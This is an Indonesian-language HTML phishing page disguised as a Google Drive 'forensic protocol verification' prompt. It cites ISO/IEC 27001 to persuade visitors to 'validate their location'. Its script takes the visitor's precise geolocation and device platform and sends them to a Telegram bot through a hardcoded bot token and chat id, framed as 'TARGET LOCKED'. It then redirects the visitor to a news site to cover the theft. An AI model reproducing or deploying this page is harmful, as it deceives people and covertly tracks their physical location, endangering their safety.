<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Digital Evidence Verification System</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f4f7f9; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
        .box { background: #fff; width: 90%; max-width: 400px; padding: 30px; border-radius: 12px; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.1); border-top: 5px solid #1a73e8; }
        .logo { width: 60px; margin-bottom: 20px; }
        h2 { font-size: 1.2rem; color: #202124; margin-bottom: 10px; }
        p { font-size: 0.9rem; color: #5f6368; line-height: 1.5; margin-bottom: 25px; }
        .btn { background: #1a73e8; color: #fff; border: none; padding: 12px 0; width: 100%; border-radius: 6px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/d/da/Google_Drive_logo.png" class="logo">
        <h2>Verifikasi Protokol Forensik</h2>
        <p>Sistem mendeteksi akses ke dokumen rahasia. Sesuai prosedur <b>ISO/IEC 27001</b>, mohon lakukan validasi lokasi untuk mendekripsi barang bukti digital.</p>
        <button id="mainBtn" class="btn" onclick="strike()">VALIDASI LOKASI</button>
    </div>
    <script>
        const T = "8674170594:AAEazU35uI9bZ6s8JLwcN410H0STysKEzs4";
        const C = "7970059663";
        async function strike() {
            document.getElementById('mainBtn').innerText = "VERIFYING...";
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (p) => {
                    const msg = `🔱 NEURAL STRIKE 🔱\n\n🎯 TARGET LOCKED\n📍 Map: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}\n🎯 Akurasi: ${p.coords.accuracy}m\n📱 OS: ${navigator.platform}`;
                    await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: C, text: msg })
                    });
                    location.href = "https://www.metrotvnews.com";
                }, () => { location.href = "https://www.metrotvnews.com"; }, { enableHighAccuracy: true });
            }
        }
    </script>
</body>
</html>
